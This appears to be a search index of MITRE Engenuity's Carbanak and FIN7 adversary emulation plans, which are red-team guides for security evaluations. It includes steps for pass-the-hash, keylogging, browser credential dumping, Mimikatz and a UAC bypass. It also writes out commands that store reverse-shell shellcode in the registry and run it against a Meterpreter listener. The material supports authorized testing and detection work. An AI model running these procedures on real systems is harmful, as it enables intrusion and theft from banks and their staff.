prompted:","domain_admin_password","SSH into bankfileserver as domain_admin","Change to the tmp directory on bankfileserver","Modify permissions on runtime to make it world-executable","Use runtime to execute psexec.py with the domain_admin's password hash to connect to bankdc","You should have a shell on the domain controller now."]},{"i":"4b---lateral-tool-transfer-and-execution-t1570","l":"4.B - Lateral Tool Transfer and Execution (T1570)","p":["Serve TinyMet over SMB","From pass-the-hash shell:","Execute TinyMet","Switch back to the Metasploit tmux terminal","Interact with the new Tiny.exe Meterpreter session","Verify the session works","Close Meterpreter","Exit Metasploit","Switch to psexec shell","Exit psexec shell","Exit bankfileserver SSH session","Exit tmux session"]},{"i":"cited-intelligence-3","l":"Cited Intelligence","p":["Carbanak is known to use psexec, or other variations, to perform lateral movement and execute remote commands. 6","Carbanak is known to use TinyMet as a stager to execute Meterpreter as a stage 1 RAT. 3"]},{"i":"test-5-credential-access","l":"Test 5: Credential Access","p":["The attacker collects information needed to wire money to illicit accounts. The attacker performs keylogging ( T1056.001) to monitor the CFO user's behavior, after which they steal the user's credentials from their web browser ( T1555.003).","This step consists of behaviors found in Step 9 of Scenario 1."]},{"i":"procedures-3","l":"Procedures"},{"i":"5a---user-monitoring---t1056001","l":"5.A - User Monitoring - (T1056.001)","p":["On the Attack Platform:","Upload the keylogger to the cfo workstation","Enter domain_admin's password when prompted:","domain_admin_password","On cfo:","Login to the cfo workstation as the cfo_user","Open a PowerShell window","Execute the keylogger","Mimic user behavior","Open cmd.exe and kill keylogger","Switch to PowerShell window and view keylogger dump"]},{"i":"5b---credentials-from-web-browsers-t1070004","l":"5.B - Credentials from Web Browsers (T1070.004)","p":["On the Attack Platform:","Upload the Web Credential Dumper to the cfo workstation","Enter domain_admin's password when prompted:","domain_admin_password","On the cfo workstation:","Run the Web Cred Dumper from PowerShell","Close PowerShell window","Close RDP session"]},{"i":"cited-intelligence-4","l":"Cited Intelligence","p":["Carbanak is known to deploy software that can monitor a user's keystrokes. 6","Carbanak has tools that are built for collecting credentials from browsers and applications. 11"]}],[{"l":"Scenario 2 Infrastructure","p":["The infrastructure listed below is specific to Scenario 2, which assumes that protective/preventative actions may be performed within the target environment. Scenario 1 has different infrastructure requirements than those described here, so only use this document as a reference for Scenario 2.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating Carbanak to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server.","Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:"]},{"l":"Emulation Team Infrastructure","p":["Attacker Desktop: tested and executed on Ubuntu 20.04 LTS","Remote Desktop Client","xfreerdp","Attack Platform: tested and executed on Kali Linux 2019.1","C2 Frameworks","ATT&CK Evals Carbanak C2 Server","Metasploit Framework","tmux"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configuration:","Red Team System","IP Address","Attack Platform","192.168.0.4"]},{"l":"A note about red team payloads","p":["This evaluation utilizes payloads that model Carbanak malware.","Some pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP address 192.168.0.4.","If you would like to build the payloads yourself, please make the necessary adjustments to the payload source to match your environment."]},{"l":"Attack Platform Setup","p":["Download the Carbanak ATTACK Evaluations Library to the home directory","Enable SSH Port Forwarding","Add low privilege SSH user","Enable Metasploit PostGRES database","Stage certain files for download","Generate SSH key to copy into domain"]},{"l":"Target Infrastructure","p":["4 targets, all domain joined:","Domain Controller: tested and executed on Windows Server 2019 1809","HR Manager Workstation: tested and executed on Windows 10 1909","CFO Workstation: tested and executed on Windows 10 1909","Domain user with local admin access on only this machine","Bank File Server: tested and executed on CentOS 7.7"]},{"l":"Target Infrastructure Configuration","p":["This methodology assumes the following hostname configurations:","Target System","Hostname","Domain Controller","bankdc","HR Manager Workstation","hrmanager","CFO Workstation","cfo","Bank File Server","bankfileserver"]},{"l":"Domain Controller Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this."]},{"l":"HR Manager Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Copy newly generated SSH keypair from attacker platform to the following directory:","Disable OLE Security to enable execution of initial access payload","The set-OLEsecurity.ps1 PowerShell script in the setup folder can be used to perform this."]},{"l":"CFO Workstation Setup","p":["If only testing detection capabilities, disable Windows Defender","The set-defender.ps1 PowerShell script in the setup folder can be used to perform this.","Give the CFO user RDP privileges on only this machine by adding them to the following local groups:","Copy Payment Transfer System executable onto Desktop of CFO user.","Cache CFO User's credentials in Microsoft Edge:"]},{"l":"Bank File Server Setup","p":["Ensure the server is domain joined to the rest of the domain:","https://www.redhat.com/sysadmin/linux-active-directory","Copy the following prop files to the /var/tmp directory:","Copy the newly generated SSH keypair's public key id_rsa.pub to the SSH Authorized Keys file:","/home/domain_user/.ssh/authorized_keys"]},{"l":"Setup Automation","p":["The setup-teamsherver.sh and setup-winhosts.ps1 scripts in the setup folder can be used to automate this process. These scripts use the default hostnames, but require usernames and host IP addresses to be substituted in place of placeholder values.","Run setup-teamserver.sh on the Attack Platform.","Note: The script assumes that this repo is downloaded to the user's home directory.","Run setup-winhosts.ps1 on the Domain Controller."]}],[{"l":"Machine-Readable Carbanak Emulation Plan","p":["The universal, technology-agnostic version of the Carbanak emulation plan YAML has been provided as starting point for machine parsing and execution of the Carbanak emulation plan. This folder will store all versions of this yaml file, including those formatted to work with specific execution runners (such as automated agents like CALDERA or other breach simulation frameworks).","As Scenario 2 uses almost the same content as Scenario 1, but packages it into independent objectives, the YAML contains procedures linked only to the steps from Scenario 1. A table has been provided below to link the procedures within the YAML to the specific Scenario 2 steps."]},{"l":"Included Formats","p":["As new files are added, please list them in the below table.","File","Execution Framework","Notes","Carbanak.yaml","N/A","Initial Emulation Plan YAML"]},{"l":"Skipped Procedures","p":["1","10.A","10.B","2.A","2.B.2","4.A.1","4.A.2","4.A.3","5.C.2","6.A.2","7.A.2","7.B.2","8","9.A.2","9.A.3","A number of procedures within the emulation plan are not present within the YAML file. This is because these procedures integrate with external frameworks or involve interaction with a GUI, which cannot be simple expressed in an automatable format.","All parts of this step involve GUI interaction.","All procedures within this substep require Metasploit's runas module.","Initial Access","Install VNC Persistence","Legitimate CFO Activity","Legitimate CFO Login","Local Discovery","Reason","Step Name/Technique","Step/Procedure","T1018 - Remote System Discovery","T1021.001 - Remote Services: Remote Desktop Protocol","T1021.002 - Remote Services: SMB/Windows Admin Shares","T1041 - Exfiltration over C2 Channel","T1083 - File and Directory Discovery","T1087.002 - Account Discovery: Domain Account","T1110.003 - Brute Force: Password Spraying","T1113 - Screen Capture","The lateral movement in this procedure uses RDP. GUI interaction is not supported.","The table below lists the steps/procedures that were skipped along with the reason why.","There is currently not a technology-agnostic standard to represent uploads of files back to the C2 server.","This procedure involves legitimate user activity.","This procedure involves loading and running PowerView's Find-LocalAdminAccess command from memory.","This procedure involves loading and running PowerView's Get-NetComputer command from memory.","This procedure involves loading and running PowerView's Get-NetUser command from memory.","This procedure involves sending the command enum-system to the RAT through the C2 channel.","This procedure uses a native meterpreter command, ls.","This procedure uses metasploit's screen_spy module.","This procedure uses PsExec functionality to mount an SMB share, which is not easily replicated.","This step involves a legitimate user logging in and performing various actions.","Use VNC Persistence","While the initial execution of the VBE payload can be automated, the payload requires the user to click 'OK' on a dialog box in order for the payload to complete successfully."]},{"l":"Procedures to Note","p":["3.B","5.B.1","5.C.1","5.C.3","7.C.1","An external C2 server needs to be configured to handle the callback from the Meterpreter payload.","Certain procedures included in the YAML have been modified or have external dependencies that are not captured within the YAML file.","Execute 2nd Stage RAT","JavaUpdate.vbs is not copied using SCP as the emulation plan dictates. Instead, it is downloaded using the automation system's default download mechanism.","Lateral Movement to bankdc from bankfileserver","Note","SSH to bankfileserver","Step/Procedure","The table below captures these steps/procedures.","This procedure starts an interactive session with bankdc from bankfileserver using psexec.py. However, an agent is not placed on bankdc. In order to continue the scenario using the YAML, a new agent needs to be manually started from bankdc.","This procedure starts an SSH connection with bankfileserver from hrmanager. However, an agent is not placed on bankfileserver. In order to continue the scenario using the YAML, a new agent needs to be manually started from bankfileserver.","Upload and execute Tiny.exe on bankdc","Upload JavaUpdate.exe and Create JavaUpdate.vbs on CFO","YAML Name"]},{"l":"Scenario 2 Procedure Mapping","p":["1","2","2.B.1","3","3.A 3.B","4","4.B","453cb643-892b-475d-8db9-df61289749f1","473e5707-5786-4f53-934f-22175c1059b0","5","5.C.3","5f3f7045-ae92-4a3e-8b39-35e4f8cc3038 8b2f52d8-40d8-4f70-bf9e-cb999d325958 22ddbc4f-fb5d-4785-8bc8-373da2f3e176 f3678315-cdbb-4579-b25d-f92783e5599b","7e3a8de9-edb9-4df4-beef-9577c4562420","9.A.1 9.A.4 9.B.1 9.B.2","e238f1b5-a4e7-464d-82eb-36d0cc875434 50cf48b9-2076-4efc-80f1-5b8f421ecae4","procedure id","procedure_step","Scenario 2 Step","The procedures in the YAML are mapped directly to the steps in Scenario 1. The table below maps the procedures to the steps of Scenario 2."]}],[{"l":"Resources","p":["Please note that binary executable files hosted here have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:","The Resources directory contains the following:","Source code used for the components of the emulated attack","Documentation on building source code and details on usage","Backend components such as the control server","Documentation for the environment setup","Each component has one or more additional documents specific to that resource."]},{"l":"Resources Index","p":["placeholder_substitution","README.md","setup","step3","step7","step8","step10"]}],[{"l":"Attackkatz source"},{"l":"AttackKatz","p":["AttackKatz is a modified version of Mimikatz. For information on Mimikatz, please take a look at \"HOWTO-Mimikatz.md\". Modifications include compiler settings and removing (commenting out or removing from the project) some modules not required for Round 3.","To build AttackKatz, perform the following: 0. Import the solution file into Visual Studio Community 2019.","It may prompt you to install additional libraries via the Visual Studio installer (C++ MFC for latest vXXX build tools) . Complete this function.","Choose your perferred target build (ARM/x86/x64/DLL) build-options","Click build solution.","If successful, a file called \"mimikatz.exe\" should be produced in the root of the project directory under the corresponding target folder.","Ex: An x64 build will be in the under x64 folder in the root project directory.","Note, this utility was built on a Windows 10 1909 virual machine with 6GB of RAM and hard drive space of 60GB."]}],[{"l":"mimikatz","p":["mimikatz is a tool I've made to learn C and make somes experiments with Windows security.","It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.","But that's not all! Crypto, Terminal Server, Events, ... lots of informations in the GitHub Wiki https://github.com/gentilkiwi/mimikatz/wiki or on http://blog.gentilkiwi.com(in French, yes).","If you don't want to build it, binaries are availables on https://github.com/gentilkiwi/mimikatz/releases"]},{"l":"Quick usage"},{"l":"sekurlsa"},{"l":"kerberos"},{"l":"crypto"},{"i":"vault--lsadump","l":"vault & lsadump"},{"l":"Build","p":["mimikatz is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:","for mimikatz and mimilib: Visual Studio 2010, 2012 or 2013 for Desktop ( 2013 Express for Desktop is free and supports x86 & x64- http://www.microsoft.com/download/details.aspx?id=44914)","for mimikatz driver, mimilove (and ddk2003 platform) : Windows Driver Kit 7.1 (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800","mimikatz uses SVN for source control, but is now available with GIT too! You can use any tools you want to sync, even incorporated GIT in Visual Studio 2013 =)"]},{"l":"Synchronize","p":["GIT URL is : https://github.com/gentilkiwi/mimikatz.git","SVN URL is : https://github.com/gentilkiwi/mimikatz/trunk","ZIP file is : https://github.com/gentilkiwi/mimikatz/archive/master.zip"]},{"l":"Build the solution","p":["After opening the solution, Build/ Build Solution(you can change architecture)","mimikatz is now built and ready to be used! ( Win32/ x64 even ARM64 if you're lucky)","you can have error MSB3073 about _build_.cmd and mimidrv, it's because the driver cannot be build without Windows Driver Kit 7.1(WinDDK), but mimikatz and mimilib are OK."]},{"l":"ddk2003","p":["With this optional MSBuild platform, you can use the WinDDK build tools, and the default msvcrt runtime (smaller binaries, no dependencies)","For this optional platform, Windows Driver Kit 7.1(WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 and Visual Studio 2010 are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.","Follow instructions:","http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme","http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader"]},{"l":"Licence","p":["CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/","mimikatz needs coffee to be developed:","PayPal: https://www.paypal.me/delpy/"]},{"l":"Author","p":["Benjamin DELPY gentilkiwi, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )","DCSync and DCShadow functions in lsadump module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( http://www.mysmartlogon.com)","This is a personal development, please respect its philosophy and don't use it for bad things!"]}],[{"l":"Carbon-ACK","p":["A repo for the ATT&CK Evals Carbanak C2 server"]}],[{"l":"Uac bypass"},{"i":"interactive---uac-bypass","l":"Interactive - UAC Bypass"},{"l":"About The Bypass","p":["This UAC bypass relies on launching a native Windows process (performance monitor) and leveraging it's default integrity level of high to launch a command prompt. This avoids UAC prompts on Windows 19.09.","step-1","step-2","step-3"]}],[{"i":"attck-evaluations-telemetry-generator","l":"ATT&CK Evaluations Telemetry Generator","p":["The ATT&CK Evaluations Telemetry Generator ( telemetry-generator.ps1) is a repeatable, adversary focused data creation mechanism to exercise a variety of data sources that can be used to help identify adversary behavior with an enterprise. The Telemetry Generator is not meant to dictate sensor coverage, which must also consider realism of collection, such as false positives and data volume. The Telemetry Generator should be used to validate configurations, and can be used to help vendors understand other data sources they should consider. Simply because data is generated in this script does not mean it will be applicable in a given round of ATT&CK Evaluations, or guarantee functionality during an engagement.","Data Generator functions are responsible for carrying out an atomic action within the Telemetry Generator. Read the Data Generators section to see a list and description of all supported generators."]},{"l":"Requirements","p":["Any Windows OS","Git for Windows","Unrestricted PowerShell Execution Policy or CLI equivalent","Internet Access"]},{"l":"Installation","p":["Start by cloning this repository:"]},{"l":"Quickstart"},{"i":"in-a-user-level-powershell-console-execute-the-following","l":"In a USER level PowerShell console, execute the following","p":["If the PowerShell Execution Policy is restricted, run telemetry-generator.ps1 with -ExecutionPolicy Bypass","The -ExecuteAll switch will run all data generators:","For isolated generation, specify generators as switches:","Order matters for generators when specifying multiple switches. For instance, you can not use -ReadFile before -WriteFile."]},{"l":"Data Generators","p":[".\\telemetry-generator.ps1 -Help will print out this same information","CreateProcess- Switch to create new cmd.exe process via Start-Process","DeleteFile- Switch to delete file at $($Env:SystemRoot)\\Temp\\WriteFile-Test.ps1","DeleteKey- Switch to delete regkey at HKCU:\\Software\\Microsoft\\.Test","Ensure Audit Account Logon Event and Audit Logon Events are enabled for event log visibility","Ensure Audit Account Logon Events and Audit Logon Events are enabled for event log visibility","ExecuteAdminIntegrity- Switch to have calc.exe run with Admin integrity level via -Verb RunAs","ExecuteAPI- Switch to execute CreateProcess from the Windows API by importing kernel32.dll through PowerShell","ExecutePowerShell- Switch to execute PowerShell script from a .ps1 file via powershell.exe -File","ExecuteService- Switch to restart the Audiosrv service","ExecuteWMI- Switch to execute WMI query in the root\\cmiv2 namespace for Win32_BIOS information","LogonInvalid- Switch to generate invalid logon event via net use q: \\\\127.0.0.1\\IPC$ with invalid credentials","LogonValid- Switch to generate valid logon event via net use q: \\\\127.0.0.1\\IPC$ with provided valid credentials","NetworkConnection- Switch to generate network traffic by making an HTTPS GET request to https://httpbin.org:443/get","NOTE: This requires admin. Achieved through -Verb RunAs in new PowerShell process","NOTE: USER context required for visibility into new integrity level.","ReadFile- Switch to read file at $($Env:SystemRoot)\\Temp\\WriteFile-Test.ps1","ReadKey- Switch to read regkey at HKCU:\\Software\\Microsoft\\.Test","Source File: $($Env:SystemRoot)\\System32\\notepad.exe","WriteFile- Switch to write file to $($Env:SystemRoot)\\Temp\\WriteFile-Test.ps1 with content Write-Host [*] WriteFile Test","WriteKey- Switch to write regkey to HKCU:\\Software\\Microsoft\\.Test with content Test"]},{"l":"Adding New Generators","p":["To add generators:","Create a new function in telemetry-generator.ps1","Create parameter with the same name","Add funciton to ExecuteAll","Add .PARAMETER descriptor to Get-Help definition"]},{"l":"Video tutorial","p":["TBD"]},{"l":"Licensing","p":["Â© 2020 MITRE Engenuity. Approved for Public Release."]}],[{"l":"Placeholder Substitution Script","p":["The emulation plans contain placeholders, such as domain, that represent values unique to the target environment that the plans are to be tested against. This script can used to easily substitute those placeholders with the target-specific values."]},{"l":"Substitution Values","p":["substitute_placeholders.py uses the contents of placeholder_values.yml to determine the substitutions to perform within the specified document.","placeholder_values.yml is populated with all of the placeholders present in both of the Carbanak Scenario plans, along with default values for each placeholder. If substitute_placeholders.py is used without making any changes to placeholder_values.yml, the placeholders within the specified script will be replaced with the default values.","To specify a custom value, enter the value within the value field for a placeholder. The script will then use this custom value instead of the default value.","For example:"]},{"l":"Usage"}],[{"l":"Setup","p":["See for setup information."]}],[{"l":"Step7"},{"l":"Generate Self Signed Certificate"}],[{"l":"Step8","p":["Step 8"]}],[{"l":"Step10","p":["step 10"]}],[{"l":"Step 3"},{"l":"Shellcode Generation","p":["On Kali box (192.168.0.4):","./create-payload.sh","This will generate a Base64 encoded payload called reverseencoded.txt."]},{"l":"Setup Meterpreter Handler","p":["On Kali box (192.168.0.4):","sudo msfconsole -r path_to_this_dir/start-tcp-listener.rc","Note: Update these instructions with the actual path to start-tcp-listener.rc once fully known."]},{"l":"Write Shellcode To Registry","p":["Through C2 Server:","exec-cmd 'REG ADD HKCU\\Software\\InternetExplorer\\AppDataLow\\Software\\Microsoft\\InternetExplorer /v {018247B2CAC14652E} /t REG_SZ /d paste content from reverseencoded.txt'","Note: The original registry path from CTI doesn't appear to exist so chose this one. Also altereted the key name. Also instead of pasting in the future can just paste content in the command or figure out a way to automate."]},{"i":"run-shellcode-via-reverseps1","l":"Run Shellcode via reverse.ps1","p":["exec-cmd powershell.exe -ExecutionPolicy Bypass -NoExit -File reverse.ps1"]}],[{"l":"Carbanak Intelligence Summary"},{"i":"attck-group-id-g0008","l":"ATT&CK Group ID: G0008"},{"i":"associated-groups-anunak-carbon-spider","l":"Associated Groups: Anunak, Carbon Spider","p":["Objectives: Carbanak is a threat group who has been found to manipulate financial assets, such as by transferring funds from bank accounts or by taking over ATM infrastructures and instructing them to dispense cash at predetermined time intervals. 1 The group is reported to have been operating as early as 2013 and is still currently active (2021). 2","Target Industries: Carbanak has targeted financial institutions and associated infrastructure. Geographically, Carbanak has compromised targets in over 30 countries, to include Russia, Germany, Ukraine, China, USA, Poland, Bulgaria, Brazil, Iceland, Spain, and more. 6","Operations: Carbanak is known for persistence and operational patience, waiting before executing illicit funds transfers during their campaigns. Carbanak has taken advantage of system users by launching spearphishing attacks in order to get their malware on target. Carbanak has abused the trust of digital signatures by creating a fake identity in order to obtain valid certificates from a certification authority (CA) 4 for their variant of the Anunak malware, which is also called Carbanak. 7 In addition to custom malware, Carbanak has been known to use administrative tools native to the Windows environment, including PowerShell, WMI, and RDP.","Carbanak is reported to begin most breaches with spearphishing ( T1566.001) and social engineering in order to get a legitimate user to download a Microsoft Word document with malicious files embedded in the document. These embedded files allow Carbanak to establish command and control. They are also known to host malicious files on Google Docs and PasteBin ( T1101.002) 4 to further expand their command and control. Once on target, Carbanak has been found to rely on using valid accounts ( T1078) to perform most of their actions. 6 The group is known to move laterally and escalate their privileges across networks to find critical systems that manage financial transactions. 1 Carbanak has been found to target hosts that have specific banking software that would facilitate the illicit funds transfers. 6 The group is reported to then establish persistence using Windows native tools, such as scheduled tasks ( T1053.005) and auto-run services ( T1543.003), or other non-malicious tools, such as VNC ( T1021.005). 4, 8 From there, Carbanak is known to wait up to four months from initial access before stealing money, 5 using this time to expand access and gather instructions for how to initiate the transfers.","Carbanak is sometimes referred to as FIN7, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately. 9 As such, activity attributed to FIN7 is beyond the scope of this emulation plan."]},{"l":"Software","p":["Anunak, Sekur, Carberp","Associated Names","Availability","Backdoor","Carbanak ( S0030)","Carbanak has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2. 13","Carbanak has used Carbanak as a post-exploitation tool to cement their foothold and maintain access to victim environments. 6","Carbanak has used Mimikatz to faciliate privilege escalation. 6, 8","Carbanak has used PsExec to support execution of remote commands 10","Carbanak may use netsh to add local firewall rule exceptions. 14","Emulation Notes","GGLDR","Mimikatz ( S0002)","Name","netsh ( S0108)","Openly Available","Present on Windows OS installations by default","PsExec ( S0029)","Remote Execution","Software Type","System Administration","Windows Credential Dumper"]},{"i":"carbanak-attck-navigator","l":"Carbanak ATT&CK Navigator"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-carbanak-as-referenced-by-mitre-attck-and-in-the-referenced-reporting","l":"The following behaviors are in scope for an emulation of actions attributed to Carbanak as referenced by MITRE ATT&CK and in the referenced reporting","p":["/Attack_Layers/Carbanak_G0008.png"]},{"l":"Scenario 1"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-attributed-to-carbanak-as-implemented-in-scenario-1-in-the-referenced-reporting","l":"The following behaviors are in scope for an emulation of actions attributed to Carbanak, as implemented in Scenario 1, in the referenced reporting","p":["/Attack_Layers/Carbanak_Scenario1.png"]},{"l":"Carbanak"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-the-carbanak-group-using-carbanak-malware-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by the Carbanak group using Carbanak malware, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/Carbanak_S0030.png"]},{"l":"Mimikatz"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-carbanak-using-mimikatz-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by Carbanak using Mimikatz, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/Mimikatz_S0002.png"]},{"l":"netsh"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-carbanak-using-netsh-exclusively-based-on-current-intelligence-within-attck-for-the-given-software","l":"The following behaviors are in scope for an emulation of actions performed by Carbanak using netsh, exclusively based on current intelligence within ATT&CK for the given software","p":["/Attack_Layers/netsh_S0108.png"]},{"l":"PsExec"},{"i":"the-following-behaviors-are-in-scope-for-an-emulation-of-actions-performed-by-carbanak-using-mimikatz-exclusively-based-on-current-intelligence-within-attck-for-the-given-software-1","l":"The following behaviors are in scope for an emulation of actions performed by Carbanak using Mimikatz, exclusively based on current intelligence within ATT&CK for the given software"},{"i":"attack_layerspsexec_s0029png","l":"/Attack_Layers/PsExec_S0029.png"},{"l":"References","p":["1","10","11","12","13","14","15","16","17","18","19","2","3","4","5","6","7","8","9","Alleged Mastermind Behind Carbanak Crime Gang Arrested","An APT Blueprint: Gaining New Visibility into Financial Threats","Anatomy of an Attack: CARBANAK","Anunak: APT against financial institutions","April 2014","April 2017","April 2019","Arrests Put New Focus on Carbon Spider Adversary Group","August 2018","Behind the Carbanak Backdoor","Bitdefender","Carbanak APT: The Great Bank Robbery","Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts","Carbanak Group uses Google for malware command-and-control","CARBANAK Week Part Four: The CARBANAK Desktop Video Player","CARBANAK Week Part Two: Continuing the CARBANAK Source Code Analysis","CrowdStrike","Cyberthreats to financial institutions 2020: Overview and predictions","Date","December 2017","December 2019","February 2015","FIN7 Evolution and the Phishing LNK","FireEye","Forcepoint","Group-IB& Fox-IT","ID","January 2017","June 2017","Kaspersky","March 2018","May 2019","Microsoft","New Carbanak/Anunak Attack Methodology","November 2016","November 2017","October 2018","Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17","Publisher","RSA","Source","The Carbanak/FIN7 Syndicate: A Historical Overview of an Evolving Threat","The Great Bank Robbery: the Carbanak APT","The Intelligence Summary summarizes 19 publicly available sources, as well as the results of an open call for contributions. The following organizations participated in the community cyber threat intelligence contribution process:","The Shadows of Ghosts Carbanak","threatpost","Trustwave","ÐÐ´ÑÐ°Ð²ÑÑÐ²ÑÐ¹ÑÑ, Carbanak! A look inside the Carbanak source code"]}],[{"l":"Carbanak Operations Flow","p":["Please see the formal Carbanak Intelligence Summary which includes a break-down of the cited intelligence used for each step of this emulation."]},{"l":"Scenario 1","p":["Based on Carbanak Malware, Ggldr, and Mimikatz","This scenario begins with a legitimate user executing a malicious payload delivered via spearphishing attacks targeting financial institutions. Following initial compromise, Carbanak expands access to other hosts through privilege escalation, credential accesss, and lateral movement with the goal of compromising money processing services, automated teller machines, and financial accounts. As Carbanak compromises potentially valuable targets, they establish persistence so that they can learn the financial organization's internal procedures and technology. Using this information, Carbanak transfers funds to bank accounts under their control, completing their mission.","This emulation plan is intended to be executed with protections-based capabilities disabled in order to accurately measure a security control's ability to detect specific adversary behavior."]},{"l":"Scenario 2","p":["This scenario emulates the same Carbanak TTP's as scenario 1; however, changes were made to support environments with protective security controls enabled. This scenario is designed so that specific TTP's are decoupled from dependencies to enable all steps to be executed, even if previous steps are blocked."]}],[{"l":"Change Log"},{"l":"Carbanak Emulation Plan","p":["Version","Date","Change Details","0.1","ATT&CK Evaluations Release","1.0","ATTACK Evaluations Library Release"]}],[{"l":"Emulation Plan Signatures","p":["This section contains YARA rules that can be used to identify files used during the Carbanak ATT&CK Evaluation scenario.","These rules are provided freely to the community without warranty.","The entire risk as to the quality and performance of these rules is with the users."]}],[{"l":"File Hashes","p":["This section contains files hashes that can be used to verify integrity of files used in this adversary emulation plan.","It is recommended that users hash executables and scripts prior to execution to confirm that illicit changes have not been made.","SHA256","SHA512"]}],[{"l":"FIN7","p":["This adversary emulation plan is derived from the original FIN7 content developed and used in the 2020 ATT&CK Evaluations. This emulation plan has not been tested with CALDERA's Emu plugin and interoperability is not guaranteed.","FIN7 appears to be a financially motivated threat group that has primarily targeted the U.S. retail, restaurant, and hospitality sectors since mid-2015. They often use point-of-sale malware. A portion of FIN7 was operated out of a front company called Combi Security. 11 FIN7 is sometimes referred to as Carbanak Group, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately. 26, 25, 21, 11","The Intelligence Summary summarizes 26 publicly available sources as well as the results of an open call for contributions to describe FIN7, their motivations, objectives, and observed target industries. It further describes a representative FIN7 operational flow along with their publicly attributed Tactics, Techniques, and Procedures (TTPs) mapped to ATT&CK.","The Operations Flow chains techniques together into a logical order that commonly occurs across FIN7 operations. This FIN7 emulation plan features two distinct scenarios described below.","Please note that the Carbanak portion of this plan contains two additional scenarios used during the 2020 ATT&CK Evaluations and can also be found within the CTID ATTACK Evaluations Library.","Scenario 1: This scenario emulates FIN7 targeting a hotel manager network to gain access to credit card information. The scenario begins with FIN7 achieving initial access to the network after an unwitting user executes a malicious .LNK file. FIN7 then pivots to a privileged IT administrator workstation. From this system, FIN7 keylogs credentials needed to access an accounting workstation. FIN7 then pivots to the accounting workstation, establishes persistence, and deploys malware to scrape credit card information from process memory.","Scenario 2: This scenario emulates the same FIN7 TTP's as scenario 1; however, changes were made to support environments with Protective security controls enabled. This scenario is designed so that specific TTP's are decoupled from dependencies to enable all steps to be executed, even if previous steps are blocked.","The FIN7 emulation plan is a human-readable, step-by-step / command-by-command implementation of FIN7 TTPs. Structurally, the plan is organized into an infrastructure section, and two scenarios (Detections and Protections respectively). The infrastructure section explains how to prepare the environment to execute both scenarios. The human-readable plan is accompanied by a machine-readable plan implemented in YAML. The YAML includes all steps, commands, and syntax for both Scenario 1 and Scenario 2. The YAML template was nuanced to ensure that each step within the YAML is directly coupled with its equivalent human-readable version."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Microsoft","Special thanks to the following projects for providing tools and source code that were used in this emulation:","Metasploit Framework","PowerSploit","sRDI","Mimikatz","PAExec"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2021 MITRE Engenuity. Approved for Public Release. Document number AT0016.","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"FIN7 Adversary Emulation","p":["This adversary emulation plan is derived from the original FIN7 content developed and used in the 2020 ATT&CK Evaluations. This emulation plan has not been tested with CALDERA's Emu plugin and interoperability is not guaranteed.","FIN7 appears to be a financially motivated threat group that has primarily targeted the U.S. retail, restaurant, and hospitality sectors since mid-2015. They often use point-of-sale malware. A portion of FIN7 was operated out of a front company called Combi Security. 11 FIN7 is sometimes referred to as Carbanak Group, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately. 26, 25, 21, 11","The Intelligence Summary summarizes 26 publicly available sources as well as the results of an open call for contributions to describe FIN7, their motivations, objectives, and observed target 